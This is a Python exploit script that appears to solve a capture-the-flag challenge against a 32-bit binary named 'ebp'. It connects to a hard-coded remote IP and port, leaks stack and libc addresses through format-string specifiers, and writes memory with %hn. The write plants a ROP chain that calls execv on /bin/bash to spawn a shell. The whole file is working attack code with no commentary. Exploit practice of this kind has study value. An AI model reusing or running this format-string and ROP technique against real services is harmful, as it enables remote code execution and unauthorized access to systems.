#!/usr/bin/env python

from chdrft.tube.connection import Connection
from chdrft.tube.process import Process
from chdrft.utils.misc import PatternMatcher, RopBuilder
import re
import time
import struct
import binascii
from chdrft.utils.binary import X86Machine, cs_print_x86_insn
import traceback
import code


id_ctrl = 23
ptr_ctrl = 0xffffcb34
thirteen_addr = 0xffffca80

test_id=27

tt_off = thirteen_addr-ptr_ctrl

id_ptr_ctrl = (ptr_ctrl-thirteen_addr)//4+14
print(id_ptr_ctrl)
libc_id_addr=44
libc_id_off=9

call_puts_addr = 0x08048533
fflush_got_plt = 0x0804A00C
fgets_got_plt = 0x0804A010
puts_got_plt = 0x0804A014

puts_plt = 0x080483C0

flush_addr = 0x08048538
id_base_addr=None


def get_id_addr(i):
    return id_base_addr+i*4

def write_ctrl_addr(x, addr):
    addr &= 0xffff
    assert addr < 0x400
    data = '%0{}x'.format(addr & 0xffff)
    data += '%{}$hn'.format(id_ctrl)
    data += 'D\n'

    x.send(data)
    res = x.recv_until(PatternMatcher.frombytes(b'D\n\n'))
    res = res.decode()


def write_addr(x, sz, post=b'', wait=1):
    if sz<=8:
        data=b'a'*sz
    else:
        data = '%0{}x'.format(sz)
        data = data.encode()
    data += '%{}$hn'.format(id_ptr_ctrl).encode()

    data += post
    data += b'D\n'

    x.send(data)
    if wait:
        res = x.recv_until(PatternMatcher.frombytes(b'D\n\n'))


def read_at(x, i):
    data = '%{}$s'.format(i)
    data=data.encode()
    END = b'DDD\n'
    data += END
    x.send(data)
    res = x.recv_until(PatternMatcher.frombytes(END))
    return res[:-4]

def read_at_ctrl(x):
    return read_at(x, id_ptr_ctrl)


def disp(x):
    data = ''
    for i in range(60):
        data += '{}:%08x '.format(i+1)
    data += '-1END\n'
    x.send(data.encode())

    res = x.recv_until(PatternMatcher.frombytes(b'END\n\n'))
    print(res)


def write_stack_buf(x, buf, addr):
    for i in range(len(buf)):
        write_ctrl_addr(x, addr+i)
        write_addr(x, buf[i])

def do_read(x, addr, n):
    test_addr=get_id_addr(test_id)
    res=b''
    while n>0:
        write_stack_buf(x, struct.pack('<I', addr+len(res)), test_addr)
        tmp=read_at(x, test_id)
        tmp+=b'\x00'
        res+=tmp
        n-=len(tmp)
    return res

def disp_ins(x, y, addr, n):
    res=do_read(x, addr, n)

    print('got res >> ', res)
    insn=y.get_ins(res, addr)
    for a in insn:
        print(hex(a.address), a.mnemonic, a.op_str)
        #cs_print_x86_insn(a)



def solve():
    remote=1
    if remote:
        conn = Connection('52.6.64.173', 4545)
    else:
        conn = Process('./ebp')

    with conn as x:

        data = ''
        for i in range(60):
            data += '{}:%08x '.format(i+1)
        data += '-1END\n'
        x.send(data.encode())
        res = x.recv_until(PatternMatcher.frombytes(b'END\n'))
        res = res.decode()
        tb = [x.split(':') for x in res.split(' ')]
        tb.pop()
        tb = {int(x[0]): int(x[1], 16) for x in tb}
        print(res)
        global id_base_addr
        id_base_addr=tb[4]-0x18-0xc-3*4
        g_int80=0xf761fa63-0xf7584979+tb[44]

        mk = tb[12] & 0xffff
        if not mk < 0x300:
            return False



        expected_exit_off=0xf7621150-0xf7619979+tb[44]
        print('cxa should be at >> ', hex(expected_exit_off))



        y=X86Machine(0)
        print(hex(tb[44]))
        #disp_ins(x, y,tb[44]-libc_id_off, 20)

        if 0:
            c=code.InteractiveConsole(locals=dict(locals(), **globals()))
            c.interact()
            return
        if 0:
            while True:
                try:
                    data=input('next addr? ')
                    data=data.split(' ')
                    addr=int(data[0], 16)
                    n=int(data[1])
                    res=do_read(x,addr,n)
                    print(res)
                    #disp_ins(x, y, addr, n)
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    print(traceback.print_exc())
                    pass


        libc_start=tb[44]-9
        if remote:
            execv_off=0x9b100
        else:
            execv_off=0x000b3140-0x00018570

        g_execv=libc_start+execv_off
        g_pop3=0x80485dd

        need_write = (tb[12]-0x20) & 0xffff

        target = tb[12] & ~0xffff
        target_start = 0x340
        target += target_start

        g_pop1 = 0x8048385
        rop=RopBuilder(target, 4)
        rop.add('I', tb[12])
        rop.add('II{I:_ref_path}{I:_ref_argv}{I:_ref_env}', g_execv,0)
        rop.add('{#argv}{I:_ref_path}{#env}I', 0)
        rop.add('{#path}{"/bin/bash}?',0)


        buf=rop.get()
        print(buf)

        for i in range(len(buf)):
            write_ctrl_addr(x, target+i)
            write_addr(x, buf[i])

        write_ctrl_addr(x, tb[4]-0x20)
        disp(x)
        input('final write')

        write_addr(x, target_start, buf, 0)

        c=code.InteractiveConsole(locals=dict(locals(), **globals()))
        c.interact()
        time.sleep(1)
        res = x.recv(1024)
        print(res)
        res = x.recv(1024)
        print(res)
        res = x.recv(1024)
        print(res)
        res = x.recv(1024)
        print(res)
        input('finish')
        return True


def test():
    tmp = b'0\x9f`\xf7 \xa2`\xf7\n\x9f`\xf7 \xa2`\xf7\n`\xf7 \xa2`\xf7\n\xf7 \xa2`\xf7\n \xa2`\xf7\n\xa2`\xf7\n`\xf7\n\xf7\n'
    tmp = b'0o^\xf7 r^\xf7\n^\xf7 r^\xf7\n r^\xf7\n^\xf7\n\n^\xf7\xd6\x83\x04\x08p\xd9Y\xf7\x10\x0c]\xf7\n\xd6\x83\x04\x08p\xd9Y\xf7\x10\x0c]\xf7\n\x04\x08p\xd9Y\xf7\x10\x0c]\xf7\n'
    tmp = b'\xc05Y\xf7\xd08Y\xf7pSY\xf7\xd6\x83\x04\x08p\xb5T\xf7P\xcdW\xf7\nY\xf7\xd08Y\xf7pSY\xf7\xd6\x83\x04\x08p\xb5T\xf7P\xcdW\xf7\n\xd08Y\xf7pSY\xf7\xd6\x83\x04\x08p\xb5T\xf7P\xcdW\xf7\nY\xf7pSY\xf7\xd6\x83\x04\x08p\xb5T\xf7P\xcdW\xf7\npSY\xf7\xd6\x83\x04\x08p\xb5T\xf7P\xcdW\xf7\nY\xf7\xd6\x83\x04\x08p\xb5T\xf7P\xcdW\xf7\n\xd6\x83\x04\x08p\xb5T\xf7P\xcdW\xf7\n\x04\x08p\xb5T\xf7P\xcdW\xf7\n'
    tmp = b'0\x8fh\xf7 \x92h\xf7\n\xf7 \x92h\xf7\nh\xf7\n\xf7\nh\xf7\xd6\x83\x04\x08p\xf9c\xf7\x10,g\xf7\n\xf7\xd6\x83\x04\x08p\xf9c\xf7\x10,g\xf7\n\x04\x08p\xf9c\xf7\x10,g\xf7\n'
    tmp=b'0\xdf\\\xf7 \xe2\\\xf7\x00\xfd\\\xf7\xd6\x83\x04\x08pIX\xf7\x10|[\xf7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'


    print(tmp.split(b'\n'))

    n = len(tmp)//4*4
    tmp = tmp[:n]
    print([hex(x) for x in struct.unpack('<{}I'.format(n//4), tmp)])
    return


def main():


    if 0:
        test()
        return
    while True:
        res = solve()
        if res:
            break
        time.sleep(0.01)


main()
